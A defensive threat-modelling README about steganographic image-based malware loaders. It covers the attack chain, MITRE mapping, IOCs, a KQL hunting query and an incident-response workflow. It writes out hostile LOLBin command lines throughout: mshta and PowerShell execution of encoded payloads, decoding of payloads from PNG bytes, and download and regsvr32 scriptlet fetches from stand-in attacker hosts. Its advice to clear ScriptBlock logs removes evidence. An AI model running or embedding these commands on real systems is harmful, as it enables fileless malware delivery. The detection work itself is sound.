# Stego-Based Loader Attack (2024–2025)  
### Behavioural Threat Modelling • Patch-Resistant Initial Access • Core Hunt Framework  
Author: Ala Dabat  
Version: 2025-12  
Repository: Threat Modelling SOP (Behavioural, Patch-Resistant TTPs)

---

# 1. Overview

Steganographic malware loaders remain one of the most evasive *initial access vectors* seen across 2024–2025.  
These campaigns embed malicious payloads inside **legitimate-looking PNG and JPG files**, typically delivered through:

- HTML smuggling  
- Email attachments  
- Password-protected ZIPs  
- Embedded images in phishing pages  
- Web delivery via compromised sites  

The loader extracts and executes the payload **entirely in memory**, often using **LOLbins** such as:

- `mshta.exe`
- `rundll32.exe`
- `powershell.exe`
- `wscript.exe` / `cscript.exe`

This README documents the attack from an **offensive perspective**, MITRE mapping, real behavioural IOCs, and defensive hunting approach.  
It is aligned with the **Threat Modelling SOP (Behavioural, Patch-Resistant TTPs)** and **Incident Response SOP**.

---

# 2. Attack Chain (Offensive Perspective)

Below is the *exact behaviour pattern* stego-based loaders use end-to-end.

## Phase 1 — Recon & Lure Preparation

1. Attacker obtains a clean PNG/JPG (company logo, invoice, delivery note).
2. Malicious payload is embedded via one of:
   - Data appended after PNG `IEND`
   - Payload encoded into pixel LSBs
   - Payload Base64-encoded into EXIF metadata
   - Polyglot image with embedded HTML/JS

**No malicious file is created. The image renders normally.**

---

## Phase 2 — Delivery

1. Delivery via HTML smuggling (most common):
   - HTML contains Base64-encoded image payload
   - JavaScript reconstructs PNG locally
   - JS extracts encrypted payload

2. Direct PNG/JPG attachment
3. PNG inside ZIP archive with password
4. Malicious image downloaded from phishing webpage

The gateway sees only a PNG or HTML, both “allowed” formats.

---

## Phase 3 — Execution Using LOLBins

Once user opens the HTML or image:

### Example attacker workflow:

1. HTML/JS spawns a LOLBin:
   ```
   mshta.exe javascript:eval(strFromCharCode(...))
   ```

2. Script extracts payload from PNG:
   ```
   wscript.exe decode.vbs   // reads bytes from the PNG
   ```

3. Payload reconstructed into memory:
   ```
   powershell.exe -ExecutionPolicy Bypass -Command "[Byte[]]$p=Get-Content .\image.png -Encoding Byte; ..."
   ```

4. Loader reflectively loads final payload:
   ```
   rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"
   ```

At no point is a malicious EXE written to disk.

---

## Phase 4 — Stage-2 Payload & C2

1. Loader contacts C2 over HTTPS (443):
   ```
   powershell.exe -ExecutionPolicy Bypass -c "Invoke-WebRequest https://cdn-attacker.com/payload"
   ```

2. Common stage-2 payloads:
   - XWorm (2024–2025)
   - RedLine / Lumma stealers
   - Custom .NET RATs
   - Keyloggers / token stealers

3. Stealth features:
   - Certificate pinning
   - C2 domain rotation
   - Encrypted JWE/JWT beacons
   - Google Drive or OneDrive as proxy channels

---

# 3. MITRE ATT&CK Mapping

| Stage | Tactic | Technique | Behaviour |
|-------|--------|-----------|-----------|
| Delivery | Initial Access | T1566.001 — Spearphishing Attachment | HTML/PNG smuggling campaign |
| Execution | Execution | T1059.005 / T1059.007 | JS/VBS/PowerShell execution |
| Defence Evasion | Defense Evasion | T1027.003 — Steganography | Payload hidden in PNG/JPG |
| Defence Evasion | Defense Evasion | T1218 — Signed Binary Proxy Execution | mshta/rundll32/wscript used to execute loaders |
| Collection | Collection | T1113 — Screen Capture (in some variants) | RAT functionality |
| Command & Control | Command and Control | T1071.001 | HTTPS tunnelling |
| Persistence | Persistence | T1547 | Registry Run keys (optional, only if RAT persists) |

---

# 4. Behavioural IOCs (High-Fidelity)

These are **behavioural**, not static artefacts.

## Parent/Child Anomalies

| Parent Process | Child LOLBin | Why Suspicious |
|----------------|--------------|----------------|
| `outlook.exe` | `mshta.exe` | Outlook almost never spawns mshta |
| `winword.exe` | `powershell.exe` | Word spawning PowerShell = highly suspicious |
| `chrome.exe` | `rundll32.exe` | Browsers rarely spawn rundll32 |
| `msedge.exe` | `wscript.exe` | Browser → script engine execution |

---

## File Access Patterns

| Signal | Description |
|--------|-------------|
| Script engine reads PNG/JPG from `%TEMP%` or `%Downloads%` | Legit scripts do not process images byte-by-byte |
| PNG/JPG read followed by network beacon | Classic stego loader sequence |
| Office file opened → image read → PowerShell spawn | Common XWorm loader chain |

---

## Network Indicators

| Behaviour | Why It Matters |
|-----------|----------------|
| First outbound connection from LOLBin | No user-driven process should do this |
| Newly registered domain contact | Most C2 domains < 7 days old |
| Repeated HTTPS POST to same domain within seconds | Loader beacon pattern |

---

# 5. Malicious LOLBin Command Line Examples (Realistic)

These are **realistic samples** commonly seen in 2024–2025 campaigns.

### mshta

```
mshta.exe "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell -ep bypass -c \"IEX([System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(\"<payload>\")))\"');close()"
```

### rundll32 loading JS

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication %TEMP%\decode.png"
```

### PowerShell decode & load

```
powershell.exe -ExecutionPolicy Bypass -c "$b=Get-Content .\logo.png -Encoding Byte; $d=[Convert]::FromBase64String([Text.Encoding]::UTF8.GetString($b[1024..2048])); IEX ([Text.Encoding]::UTF8.GetString($d))"
```

### WScript reading PNG bytes

```
wscript.exe decode.vbs // decode.vbs reads .png and extracts embedded shellcode
```

### C2 communication

```
powershell.exe -nop -w hidden -c "Invoke-RestMethod -Uri https://news-files-cdn[.]com/api"
```

---

# 6. Core Hunt Rule (Revised, Low Noise, High Fidelity)

This is the **polished core rule** (L3-ready) built from your initial concept.  
It focuses on the *behavioural chain*, not individual events.

````kql
// CORE HUNT: Stego Loader Initial Access Chain
let lookback = 7d;

// Step 1 – Identify suspicious LOLBin execution from user-facing apps
let SuspiciousExec = 
DeviceProcessEvents
| where Timestamp > ago(lookback)
| where InitiatingProcessParentFileName in~ ("outlook.exe","chrome.exe","msedge.exe","winword.exe","excel.exe")
| where FileName in~ ("powershell.exe","cmd.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe")
| project DeviceId, InitiatingProcessId, InitiatingProcessParentFileName, FileName, ProcessCommandLine, Timestamp;

// Step 2 – Image file reads correlated to the same initiating process
let ImageReads = 
DeviceFileEvents
| where Timestamp > ago(lookback)
| where ActionType == "FileRead"
| where FileName endswith ".png" or FileName endswith ".jpg"
| where FolderPath contains "Temp" or FolderPath contains "Downloads"
| project DeviceId, InitiatingProcessId, ImageReadTime=Timestamp, ReadFile=FileName;

// Step 3 – Network beacons from same process
let NetworkBeacons = 
DeviceNetworkEvents
| where Timestamp > ago(lookback)
| where InitiatingProcessFileName in ("powershell.exe","mshta.exe","rundll32.exe","wscript.exe")
| project DeviceId, InitiatingProcessId, BeaconTime=Timestamp, RemoteUrl, RemoteIP;

// Step 4 – Correlation window within 2 minutes
---

SuspiciousExec
| join kind=inner ImageReads on DeviceId, InitiatingProcessId
| join kind=inner NetworkBeacons on DeviceId, InitiatingProcessId
| where BeaconTime between (ImageReadTime .. ImageReadTime + 2m)
| extend Score = 1
| extend HunterDirective = 
    "Investigate immediate: User app launched LOLBin, read image from temp/downloads, then beaconed externally. Likely stego loader or HTML smuggling chain. Capture memory, isolate host, and check for further script-based execution."
| project Timestamp, DeviceId, InitiatingProcessParentFileName, FileName, ReadFile, RemoteUrl, RemoteIP, ProcessCommandLine, Score, HunterDirective
| order by Timestamp desc

````
## 7. MITRE ATT&CK Mapping (Steganographic Loader Attacks)

| Phase | Tactic (MITRE) | Technique ID | Description | What Happens in This Attack |
|------|----------------|--------------|-------------|------------------------------|
| Delivery | Initial Access | **T1566.001 — Spearphishing Attachment** | HTML or PNG delivered via email | User opens a malicious HTML/PNG container |
| Execution | Execution | **T1059.005 — Script Execution (JS/VBS)** | JavaScript/VBScript decoder executed | HTML smuggling triggers payload extraction |
| Execution | Execution | **T1059.007 — Command Interpreter (PowerShell, CMD)** | Script launches LOLBin for decoding | mshta / powershell loads encoded payload |
| Defense Evasion | Obfuscation | **T1027.003 — Steganography** | Payload hidden inside image | PNG/JPEG contains encoded DLL/shellcode |
| Defense Evasion | Living-Off-The-Land | **T1218 — Signed Binary Proxy Execution** | Use of trusted LOLBins | mshta, rundll32, powershell used for payload exec |
| Defense Evasion | Fileless Execution | **T1106 — Native API** | VirtualAlloc, CreateThread | Loader executes payload directly in memory |
| Command & Control | C2 Communications | **T1071.001 — Web Protocols** | HTTPS beacon | Fileless loader contacts remote domain |
| Persistence / Follow-On | Privilege Escalation | **T1055 — Process Injection** | Process hollowing/injection | XWorm injected into dllhost.exe/svchost.exe |

---

## 8. IOC Catalogue (Core Indicators for Stego-Based Loaders)

### **File IOCs**
- PNG/JPG in `%TEMP%` or `%USERPROFILE%\Downloads` accessed by script engines  
  - Example: `C:\Users\user\AppData\Local\Temp\inv_00433.png`
- HTML attachments containing obfuscated JS:
  - `<script>eval(String.fromCharCode(...))</script>`

### **Process IOCs**
- Office/browser spawning script engines:
  - `OUTLOOK.EXE → mshta.exe`
  - `CHROME.EXE → powershell.exe -ep bypass`
  - `WINWORD.EXE → wscript.exe`

### **Network IOCs**
- First outbound connection made by:
  - `powershell.exe`
  - `rundll32.exe`
  - `mshta.exe`
- HTTPS traffic to recently registered domains (.top, .xyz, .club)
- Beacon jitter: 20–60 secs to evade simple heuristics

### **Behavior IOCs**
- Script hosts reading PNG/JPEG files
- Fileless memory allocations shortly before C2 traffic
- DLL loaded without touching disk (reflective loading)

---

## 9. Malicious LOLBin Command-Line Glossary (Stego Attacks)

### **mshta.exe**
```cmd
mshta.exe javascript:"eval(String.fromCharCode(...))"
mshta.exe C:\Users\user\AppData\Local\Temp\invoice.html

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"
rundll32.exe C:\Users\user\AppData\Local\Temp\img_loader.dll,Start

powershell -ep bypass -c "IEX([System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((Get-Content final.png)))))"
powershell -nop -w hidden -c "(New-Object Net.WebClient).DownloadData('https://examplecdn.top/payload')"

wscript.exe decode_image.js
cscript.exe decode_png.vbs

regsvr32 /s /n /u /i:https://cdn.attacker.com/stage.sct scrobj.dll

```
          [ EMAIL DELIVERY ]
                   |
                   v
        +------------------------+
        |  HTML / PNG Attachment |
        +------------------------+
                   |
         User Opens File (HTML)
                   |
                   v
     [ JavaScript/VBS Decoder Stage ]
                   |
                   v
        +---------------------------+
        | LOLBin Execution (mshta) |
        +---------------------------+
                   |
      Reads PNG/JPEG from TEMP/Downloads
                   |
                   v
       [ Extract Hidden Payload (DLL/SC) ]
                   |
                   v
        +------------------------------+
        | In-Memory Execution Engine  |
        |   VirtualAlloc / Reflective |
        +------------------------------+
                   |
                   v

                   

                   
       [ Outbound HTTPS C2 Connection ]
                   |
                   v
       Stage 2 Payload Delivered (XWorm)
                   |
                   v
      SYSTEM COMPROMISE → CREDENTIAL THEFT

```
```
##11. Incident Response Workflow (Aligned to IR & Threat Modelling SOP)

#Step 1 — Identify

Confirm presence of:

Office/browser → LOLBin → PNG read → network chain

Fileless execution artifacts

Suspicious TLS outbound traffic


Immediately tag endpoints as P1 priority


#Step 2 — Contain

Isolate endpoint using MDE automated response

Block observed C2 domain/IP at firewall/WAF

Disable exposed user accounts (O365 + local AD)


#Step 3 — Investigate

Extract full process lineage from:

DeviceProcessEvents

DeviceFileEvents

DeviceNetworkEvents


Check mailbox for matching malicious HTML/PNG delivery

Review browsing and download history


#Step 4 — Eradicate

Remove persistence:

Startup entries

Schedule tasks

Registry Run keys


Clear ScriptBlock logs revealing decoded payload


#Step 5 — Recover

Rebuild compromised hosts if memory-only RAT activity detected

Re-enable accounts post-password reset

Validate no lateral movement occurred (PsExec, WMI, RPC)


#Step 6 — Lessons Learned

Add sender domain to banned list

Enable stricter attachment filtering (block HTML)

Implement WDAC policy for script engines

Update threat model under “Initial Access: Image-Based Payloads”
